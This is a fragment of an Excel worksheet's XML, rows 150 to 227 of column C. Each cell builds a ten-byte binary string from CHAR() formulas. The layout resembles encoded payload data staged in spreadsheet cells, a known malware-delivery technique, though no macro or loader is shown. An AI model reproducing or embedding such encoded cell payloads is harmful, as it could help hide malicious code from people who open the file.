        <f>CHAR(93)&amp;CHAR(228)&amp;CHAR(5)&amp;CHAR(232)&amp;CHAR(126)&amp;CHAR(34)&amp;CHAR(75)&amp;CHAR(185)&amp;CHAR(158)&amp;CHAR(249)</f>
        <v>]ä_x0005_è~"K¹žù</v>
      </c>
    </row>
    <row r="151" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C151" t="str">
        <f>CHAR(225)&amp;CHAR(76)&amp;CHAR(99)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(152)&amp;CHAR(69)&amp;CHAR(61)&amp;CHAR(142)</f>
        <v>áLcÏ&gt;±˜E=Ž</v>
      </c>
    </row>
    <row r="152" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C152" t="str">
        <f>CHAR(190)&amp;CHAR(68)&amp;CHAR(74)&amp;CHAR(149)&amp;CHAR(210)&amp;CHAR(133)&amp;CHAR(32)&amp;CHAR(75)&amp;CHAR(186)&amp;CHAR(68)</f>
        <v>¾DJ•Ò… KºD</v>
      </c>
    </row>
    <row r="153" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C153" t="str">
        <f>CHAR(117)&amp;CHAR(169)&amp;CHAR(147)&amp;CHAR(67)&amp;CHAR(114)&amp;CHAR(133)&amp;CHAR(178)&amp;CHAR(206)&amp;CHAR(228)&amp;CHAR(78)</f>
        <v>u©“Cr…²ÎäN</v>
      </c>
    </row>
    <row r="154" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C154" t="str">
        <f>CHAR(31)&amp;CHAR(133)&amp;CHAR(172)&amp;CHAR(129)&amp;CHAR(113)&amp;CHAR(142)&amp;CHAR(181)&amp;CHAR(141)&amp;CHAR(242)&amp;CHAR(128)</f>
        <v>_x001F_…¬qŽµò€</v>
      </c>
    </row>
    <row r="155" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C155" t="str">
        <f>CHAR(32)&amp;CHAR(122)&amp;CHAR(179)&amp;CHAR(70)&amp;CHAR(232)&amp;CHAR(23)&amp;CHAR(163)&amp;CHAR(216)&amp;CHAR(171)&amp;CHAR(163)</f>
        <v xml:space="preserve"> z³Fè_x0017_£Ø«£</v>
      </c>
    </row>
    <row r="156" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C156" t="str">
        <f>CHAR(127)&amp;CHAR(15)&amp;CHAR(74)&amp;CHAR(179)&amp;CHAR(61)&amp;CHAR(61)&amp;CHAR(171)&amp;CHAR(162)&amp;CHAR(127)&amp;CHAR(15)</f>
        <v>_x000F_J³==«¢_x000F_</v>
      </c>
    </row>
    <row r="157" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C157" t="str">
        <f>CHAR(74)&amp;CHAR(186)&amp;CHAR(61)&amp;CHAR(37)&amp;CHAR(164)&amp;CHAR(108)&amp;CHAR(142)&amp;CHAR(22)&amp;CHAR(118)&amp;CHAR(128)</f>
        <v>Jº=%¤lŽ_x0016_v€</v>
      </c>
    </row>
    <row r="158" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C158" t="str">
        <f>CHAR(22)&amp;CHAR(35)&amp;CHAR(116)&amp;CHAR(224)&amp;CHAR(112)&amp;CHAR(172)&amp;CHAR(26)&amp;CHAR(248)&amp;CHAR(215)&amp;CHAR(20)</f>
        <v>_x0016_#tàp¬_x001A_ø×_x0014_</v>
      </c>
    </row>
    <row r="159" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C159" t="str">
        <f>CHAR(71)&amp;CHAR(228)&amp;CHAR(112)&amp;CHAR(195)&amp;CHAR(114)&amp;CHAR(244)&amp;CHAR(93)&amp;CHAR(171)&amp;CHAR(61)&amp;CHAR(236)</f>
        <v>GäpÃrô]«=ì</v>
      </c>
    </row>
    <row r="160" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C160" t="str">
        <f>CHAR(250)&amp;CHAR(19)&amp;CHAR(127)&amp;CHAR(58)&amp;CHAR(210)&amp;CHAR(68)&amp;CHAR(109)&amp;CHAR(156)&amp;CHAR(19)&amp;CHAR(179)</f>
        <v>ú_x0013_:ÒDmœ_x0013_³</v>
      </c>
    </row>
    <row r="161" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C161" t="str">
        <f>CHAR(8)&amp;CHAR(253)&amp;CHAR(239)&amp;CHAR(56)&amp;CHAR(82)&amp;CHAR(148)&amp;CHAR(179)&amp;CHAR(66)&amp;CHAR(10)&amp;CHAR(169)</f>
        <v>_x0008_ýï8R”³B
©</v>
      </c>
    </row>
    <row r="162" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C162" t="str">
        <f>CHAR(158)&amp;CHAR(69)&amp;CHAR(93)&amp;CHAR(129)&amp;CHAR(147)&amp;CHAR(107)&amp;CHAR(190)&amp;CHAR(143)&amp;CHAR(248)&amp;CHAR(189)</f>
        <v>žE]“k¾ø½</v>
      </c>
    </row>
    <row r="163" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C163" t="str">
        <f>CHAR(219)&amp;CHAR(1)&amp;CHAR(60)&amp;CHAR(200)&amp;CHAR(122)&amp;CHAR(253)&amp;CHAR(154)&amp;CHAR(200)&amp;CHAR(108)&amp;CHAR(44)</f>
        <v>Û_x0001_&lt;ÈzýšÈl,</v>
      </c>
    </row>
    <row r="164" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C164" t="str">
        <f>CHAR(61)&amp;CHAR(135)&amp;CHAR(179)&amp;CHAR(253)&amp;CHAR(242)&amp;CHAR(160)&amp;CHAR(96)&amp;CHAR(90)&amp;CHAR(42)&amp;CHAR(130)</f>
        <v>=‡³ýò `Z*‚</v>
      </c>
    </row>
    <row r="165" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C165" t="str">
        <f>CHAR(183)&amp;CHAR(65)&amp;CHAR(158)&amp;CHAR(69)&amp;CHAR(109)&amp;CHAR(129)&amp;CHAR(147)&amp;CHAR(135)&amp;CHAR(183)&amp;CHAR(67)</f>
        <v>·AžEm“‡·C</v>
      </c>
    </row>
    <row r="166" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C166" t="str">
        <f>CHAR(63)&amp;CHAR(54)&amp;CHAR(223)&amp;CHAR(90)&amp;CHAR(4)&amp;CHAR(135)&amp;CHAR(63)&amp;CHAR(105)&amp;CHAR(159)&amp;CHAR(65)</f>
        <v>?6ßZ_x0004_‡?iŸA</v>
      </c>
    </row>
    <row r="167" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C167" t="str">
        <f>CHAR(33)&amp;CHAR(237)&amp;CHAR(112)&amp;CHAR(147)&amp;CHAR(26)&amp;CHAR(153)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(77)&amp;CHAR(129)</f>
        <v>!íp“_x001A_™žCM</v>
      </c>
    </row>
    <row r="168" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C168" t="str">
        <f>CHAR(203)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(205)&amp;CHAR(242)&amp;CHAR(240)&amp;CHAR(105)&amp;CHAR(46)&amp;CHAR(143)&amp;CHAR(235)</f>
        <v>Ë‡µÍòði.ë</v>
      </c>
    </row>
    <row r="169" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C169" t="str">
        <f>CHAR(126)&amp;CHAR(253)&amp;CHAR(93)&amp;CHAR(172)&amp;CHAR(5)&amp;CHAR(237)&amp;CHAR(183)&amp;CHAR(68)&amp;CHAR(82)&amp;CHAR(149)</f>
        <v>~ý]¬_x0005_í·DR•</v>
      </c>
    </row>
    <row r="170" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C170" t="str">
        <f>CHAR(134)&amp;CHAR(132)&amp;CHAR(170)&amp;CHAR(209)&amp;CHAR(223)&amp;CHAR(151)&amp;CHAR(114)&amp;CHAR(58)&amp;CHAR(170)&amp;CHAR(236)</f>
        <v>†„ªÑß—r:ªì</v>
      </c>
    </row>
    <row r="171" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C171" t="str">
        <f>CHAR(65)&amp;CHAR(237)&amp;CHAR(122)&amp;CHAR(11)&amp;CHAR(86)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(226)&amp;CHAR(40)</f>
        <v>Aíz_x000B_V°ÖÈâ(</v>
      </c>
    </row>
    <row r="172" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C172" t="str">
        <f>CHAR(227)&amp;CHAR(79)&amp;CHAR(172)&amp;CHAR(63)&amp;CHAR(216)&amp;CHAR(175)&amp;CHAR(105)&amp;CHAR(22)&amp;CHAR(247)&amp;CHAR(176)</f>
        <v>ãO¬?Ø¯i_x0016_÷°</v>
      </c>
    </row>
    <row r="173" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C173" t="str">
        <f>CHAR(150)&amp;CHAR(137)&amp;CHAR(82)&amp;CHAR(32)&amp;CHAR(255)&amp;CHAR(59)&amp;CHAR(32)&amp;CHAR(253)&amp;CHAR(237)&amp;CHAR(2)</f>
        <v>–‰R ÿ; ýí_x0002_</v>
      </c>
    </row>
    <row r="174" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C174" t="str">
        <f>CHAR(111)&amp;CHAR(237)&amp;CHAR(96)&amp;CHAR(39)&amp;CHAR(252)&amp;CHAR(110)&amp;CHAR(118)&amp;CHAR(53)&amp;CHAR(35)&amp;CHAR(250)</f>
        <v>oí`'ünv5#ú</v>
      </c>
    </row>
    <row r="175" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C175" t="str">
        <f>CHAR(55)&amp;CHAR(119)&amp;CHAR(42)&amp;CHAR(246)&amp;CHAR(131)&amp;CHAR(158)&amp;CHAR(108)&amp;CHAR(162)&amp;CHAR(105)&amp;CHAR(44)</f>
        <v>7w*öƒžl¢i,</v>
      </c>
    </row>
    <row r="176" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C176" t="str">
        <f>CHAR(75)&amp;CHAR(123)&amp;CHAR(142)&amp;CHAR(122)&amp;CHAR(144)&amp;CHAR(160)&amp;CHAR(176)&amp;CHAR(135)&amp;CHAR(156)&amp;CHAR(224)</f>
        <v>K{Žz °‡œà</v>
      </c>
    </row>
    <row r="177" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C177" t="str">
        <f>CHAR(245)&amp;CHAR(139)&amp;CHAR(125)&amp;CHAR(26)&amp;CHAR(48)&amp;CHAR(57)&amp;CHAR(187)&amp;CHAR(207)&amp;CHAR(254)&amp;CHAR(254)</f>
        <v>õ‹}_x001A_09»Ïþþ</v>
      </c>
    </row>
    <row r="178" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C178" t="str">
        <f>CHAR(117)&amp;CHAR(194)&amp;CHAR(31)&amp;CHAR(134)&amp;CHAR(156)&amp;CHAR(224)&amp;CHAR(245)&amp;CHAR(139)&amp;CHAR(125)&amp;CHAR(26)</f>
        <v>uÂ_x001F_†œàõ‹}_x001A_</v>
      </c>
    </row>
    <row r="179" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C179" t="str">
        <f>CHAR(48)&amp;CHAR(57)&amp;CHAR(187)&amp;CHAR(207)&amp;CHAR(254)&amp;CHAR(254)&amp;CHAR(117)&amp;CHAR(194)&amp;CHAR(31)&amp;CHAR(121)</f>
        <v>09»ÏþþuÂ_x001F_y</v>
      </c>
    </row>
    <row r="180" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C180" t="str">
        <f>CHAR(109)&amp;CHAR(57)&amp;CHAR(59)&amp;CHAR(152)&amp;CHAR(253)&amp;CHAR(171)&amp;CHAR(23)&amp;CHAR(8)&amp;CHAR(112)&amp;CHAR(11)</f>
        <v>m9;˜ý«_x0017__x0008_p_x000B_</v>
      </c>
    </row>
    <row r="181" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C181" t="str">
        <f>CHAR(6)&amp;CHAR(45)&amp;CHAR(36)&amp;CHAR(111)&amp;CHAR(50)&amp;CHAR(211)&amp;CHAR(251)&amp;CHAR(251)&amp;CHAR(62)&amp;CHAR(159)</f>
        <v>_x0006_-$o2Óûû&gt;Ÿ</v>
      </c>
    </row>
    <row r="182" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C182" t="str">
        <f>CHAR(214)&amp;CHAR(248)&amp;CHAR(33)&amp;CHAR(139)&amp;CHAR(251)&amp;CHAR(252)&amp;CHAR(62)&amp;CHAR(129)&amp;CHAR(214)&amp;CHAR(251)</f>
        <v>Öø!‹ûü&gt;Öû</v>
      </c>
    </row>
    <row r="183" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C183" t="str">
        <f>CHAR(33)&amp;CHAR(148)&amp;CHAR(251)&amp;CHAR(246)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!”ûö&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="184" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C184" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="185" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C185" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(131)&amp;CHAR(100)&amp;CHAR(247)&amp;CHAR(181)&amp;CHAR(138)&amp;CHAR(114)&amp;CHAR(130)</f>
        <v>&gt;±Öƒd÷µŠr‚</v>
      </c>
    </row>
    <row r="186" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C186" t="str">
        <f>CHAR(228)&amp;CHAR(230)&amp;CHAR(101)&amp;CHAR(233)&amp;CHAR(183)&amp;CHAR(207)&amp;CHAR(114)&amp;CHAR(222)&amp;CHAR(183)&amp;CHAR(172)</f>
        <v>äæeé·ÏrÞ·¬</v>
      </c>
    </row>
    <row r="187" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C187" t="str">
        <f>CHAR(109)&amp;CHAR(204)&amp;CHAR(153)&amp;CHAR(189)&amp;CHAR(95)&amp;CHAR(195)&amp;CHAR(175)&amp;CHAR(137)&amp;CHAR(33)&amp;CHAR(243)</f>
        <v>mÌ™½_Ã¯‰!ó</v>
      </c>
    </row>
    <row r="188" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C188" t="str">
        <f>CHAR(146)&amp;CHAR(189)&amp;CHAR(74)&amp;CHAR(196)&amp;CHAR(183)&amp;CHAR(164)&amp;CHAR(96)&amp;CHAR(201)&amp;CHAR(151)&amp;CHAR(160)</f>
        <v>’½JÄ·¤`É— </v>
      </c>
    </row>
    <row r="189" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C189" t="str">
        <f>CHAR(93)&amp;CHAR(177)&amp;CHAR(128)&amp;CHAR(161)&amp;CHAR(83)&amp;CHAR(209)&amp;CHAR(142)&amp;CHAR(174)&amp;CHAR(82)&amp;CHAR(247)</f>
        <v>]±€¡SÑŽ®R÷</v>
      </c>
    </row>
    <row r="190" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C190" t="str">
        <f>CHAR(164)&amp;CHAR(173)&amp;CHAR(68)&amp;CHAR(165)&amp;CHAR(182)&amp;CHAR(156)&amp;CHAR(125)&amp;CHAR(254)&amp;CHAR(132)&amp;CHAR(141)</f>
        <v>¤­D¥¶œ}þ„</v>
      </c>
    </row>
    <row r="191" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C191" t="str">
        <f>CHAR(100)&amp;CHAR(139)&amp;CHAR(191)&amp;CHAR(131)&amp;CHAR(114)&amp;CHAR(177)&amp;CHAR(149)&amp;CHAR(132)&amp;CHAR(115)&amp;CHAR(230)</f>
        <v>d‹¿ƒr±•„sæ</v>
      </c>
    </row>
    <row r="192" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C192" t="str">
        <f>CHAR(137)&amp;CHAR(170)&amp;CHAR(95)&amp;CHAR(197)&amp;CHAR(179)&amp;CHAR(129)&amp;CHAR(79)&amp;CHAR(214)&amp;CHAR(143)&amp;CHAR(174)</f>
        <v>‰ª_Å³OÖ®</v>
      </c>
    </row>
    <row r="193" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C193" t="str">
        <f>CHAR(80)&amp;CHAR(210)&amp;CHAR(179)&amp;CHAR(200)&amp;CHAR(110)&amp;CHAR(233)&amp;CHAR(190)&amp;CHAR(142)&amp;CHAR(107)&amp;CHAR(229)</f>
        <v>PÒ³Èné¾Žkå</v>
      </c>
    </row>
    <row r="194" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C194" t="str">
        <f>CHAR(229)&amp;CHAR(250)&amp;CHAR(15)&amp;CHAR(225)&amp;CHAR(183)&amp;CHAR(131)&amp;CHAR(62)&amp;CHAR(226)&amp;CHAR(183)&amp;CHAR(174)</f>
        <v>åú_x000F_á·ƒ&gt;â·®</v>
      </c>
    </row>
    <row r="195" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C195" t="str">
        <f>CHAR(68)&amp;CHAR(228)&amp;CHAR(137)&amp;CHAR(189)&amp;CHAR(95)&amp;CHAR(200)&amp;CHAR(149)&amp;CHAR(186)&amp;CHAR(68)&amp;CHAR(196)</f>
        <v>Dä‰½_È•ºDÄ</v>
      </c>
    </row>
    <row r="196" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C196" t="str">
        <f>CHAR(143)&amp;CHAR(170)&amp;CHAR(62)&amp;CHAR(226)&amp;CHAR(183)&amp;CHAR(174)&amp;CHAR(68)&amp;CHAR(228)&amp;CHAR(137)&amp;CHAR(189)</f>
        <v>ª&gt;â·®Dä‰½</v>
      </c>
    </row>
    <row r="197" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C197" t="str">
        <f>CHAR(95)&amp;CHAR(200)&amp;CHAR(149)&amp;CHAR(186)&amp;CHAR(68)&amp;CHAR(196)&amp;CHAR(143)&amp;CHAR(170)&amp;CHAR(104)&amp;CHAR(212)</f>
        <v>_È•ºDÄªhÔ</v>
      </c>
    </row>
    <row r="198" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C198" t="str">
        <f>CHAR(181)&amp;CHAR(188)&amp;CHAR(78)&amp;CHAR(215)&amp;CHAR(251)&amp;CHAR(156)&amp;CHAR(95)&amp;CHAR(215)&amp;CHAR(179)&amp;CHAR(137)</f>
        <v>µ¼N×ûœ_×³‰</v>
      </c>
    </row>
    <row r="199" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C199" t="str">
        <f>CHAR(83)&amp;CHAR(215)&amp;CHAR(154)&amp;CHAR(182)&amp;CHAR(127)&amp;CHAR(210)&amp;CHAR(181)&amp;CHAR(173)&amp;CHAR(82)&amp;CHAR(214)</f>
        <v>S×š¶Òµ­RÖ</v>
      </c>
    </row>
    <row r="200" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C200" t="str">
        <f>CHAR(191)&amp;CHAR(174)&amp;CHAR(74)&amp;CHAR(208)&amp;CHAR(214)&amp;CHAR(155)&amp;CHAR(64)&amp;CHAR(195)&amp;CHAR(158)&amp;CHAR(142)</f>
        <v>¿®JÐÖ›@ÃžŽ</v>
      </c>
    </row>
    <row r="201" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C201" t="str">
        <f>CHAR(76)&amp;CHAR(195)&amp;CHAR(183)&amp;CHAR(177)&amp;CHAR(116)&amp;CHAR(203)&amp;CHAR(154)&amp;CHAR(172)&amp;CHAR(93)&amp;CHAR(212)</f>
        <v>LÃ·±tËš¬]Ô</v>
      </c>
    </row>
    <row r="202" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C202" t="str">
        <f>CHAR(165)&amp;CHAR(187)&amp;CHAR(101)&amp;CHAR(196)&amp;CHAR(143)&amp;CHAR(174)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(183)&amp;CHAR(186)</f>
        <v>¥»eÄ®&gt;ç·º</v>
      </c>
    </row>
    <row r="203" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C203" t="str">
        <f>CHAR(72)&amp;CHAR(196)&amp;CHAR(149)&amp;CHAR(187)&amp;CHAR(119)&amp;CHAR(223)&amp;CHAR(191)&amp;CHAR(188)&amp;CHAR(33)&amp;CHAR(232)</f>
        <v>HÄ•»wß¿¼!è</v>
      </c>
    </row>
    <row r="204" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C204" t="str">
        <f>CHAR(161)&amp;CHAR(95)&amp;CHAR(62)&amp;CHAR(178)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(161)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>¡_&gt;²ÖÈ!¡ûÏ</v>
      </c>
    </row>
    <row r="205" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C205" t="str">
        <f>CHAR(62)&amp;CHAR(78)&amp;CHAR(41)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;N)È!_x001D_ûÏ&gt;±</v>
      </c>
    </row>
    <row r="206" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C206" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(229)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!åûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="207" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C207" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="208" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C208" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="209" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C209" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(49)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;1</v>
      </c>
    </row>
    <row r="210" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C210" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(171)&amp;CHAR(228)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(177)&amp;CHAR(98)&amp;CHAR(193)</f>
        <v>ÖÈ!«äu0±bÁ</v>
      </c>
    </row>
    <row r="211" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C211" t="str">
        <f>CHAR(236)&amp;CHAR(132)&amp;CHAR(67)&amp;CHAR(206)&amp;CHAR(114)&amp;CHAR(124)&amp;CHAR(247)&amp;CHAR(156)&amp;CHAR(73)&amp;CHAR(204)</f>
        <v>ì„CÎr|÷œIÌ</v>
      </c>
    </row>
    <row r="212" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C212" t="str">
        <f>CHAR(136)&amp;CHAR(239)&amp;CHAR(78)&amp;CHAR(195)&amp;CHAR(185)&amp;CHAR(175)&amp;CHAR(83)&amp;CHAR(196)&amp;CHAR(150)&amp;CHAR(239)</f>
        <v>ˆïNÃ¹¯SÄ–ï</v>
      </c>
    </row>
    <row r="213" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C213" t="str">
        <f>CHAR(93)&amp;CHAR(208)&amp;CHAR(184)&amp;CHAR(166)&amp;CHAR(78)&amp;CHAR(209)&amp;CHAR(219)&amp;CHAR(173)&amp;CHAR(91)&amp;CHAR(145)</f>
        <v>]Ð¸¦NÑÛ­[‘</v>
      </c>
    </row>
    <row r="214" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C214" t="str">
        <f>CHAR(164)&amp;CHAR(189)&amp;CHAR(79)&amp;CHAR(133)&amp;CHAR(146)&amp;CHAR(161)&amp;CHAR(30)&amp;CHAR(245)&amp;CHAR(153)&amp;CHAR(155)</f>
        <v>¤½O…’¡_x001E_õ™›</v>
      </c>
    </row>
    <row r="215" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C215" t="str">
        <f>CHAR(1)&amp;CHAR(200)&amp;CHAR(148)&amp;CHAR(171)&amp;CHAR(91)&amp;CHAR(159)&amp;CHAR(219)&amp;CHAR(197)&amp;CHAR(43)&amp;CHAR(129)</f>
        <v>_x0001_È”«[ŸÛÅ+</v>
      </c>
    </row>
    <row r="216" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C216" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(245)&amp;CHAR(190)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!õ¾Ï</v>
      </c>
    </row>
    <row r="217" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C217" t="str">
        <f>CHAR(62)&amp;CHAR(213)&amp;CHAR(80)&amp;CHAR(204)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;ÕPÌ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="218" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C218" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(65)&amp;CHAR(214)&amp;CHAR(234)</f>
        <v>ÖÈ!¥ûÏ&gt;AÖê</v>
      </c>
    </row>
    <row r="219" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C219" t="str">
        <f>CHAR(33)&amp;CHAR(174)&amp;CHAR(249)&amp;CHAR(199)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(194)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!®ùÇ&gt;±ÂÈ!¥</v>
      </c>
    </row>
    <row r="220" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C220" t="str">
        <f>CHAR(243)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(107)&amp;CHAR(201)&amp;CHAR(207)</f>
        <v>óÏ&gt;±ÖÈ!kÉÏ</v>
      </c>
    </row>
    <row r="221" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C221" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(246)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(143)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±öÈ!¥û&gt;±</v>
      </c>
    </row>
    <row r="222" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C222" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(219)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(212)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ÛÏ&gt;±ÔÈ</v>
      </c>
    </row>
    <row r="223" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C223" t="str">
        <f>CHAR(33)&amp;CHAR(161)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(161)</f>
        <v>!¡ûÏ&gt;±ÖÈ!¡</v>
      </c>
    </row>
    <row r="224" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C224" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(91)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥[Ï</v>
      </c>
    </row>
    <row r="225" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C225" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(210)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(178)</f>
        <v>&gt;±ÒÈ!¥ûÏ&gt;²</v>
      </c>
    </row>
    <row r="226" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C226" t="str">
        <f>CHAR(214)&amp;CHAR(136)&amp;CHAR(164)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(143)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>Öˆ¤¥û&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="227" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C227" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(187)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥»Ï&gt;±ÖÈ!¥</v>
      </c>
    </row>
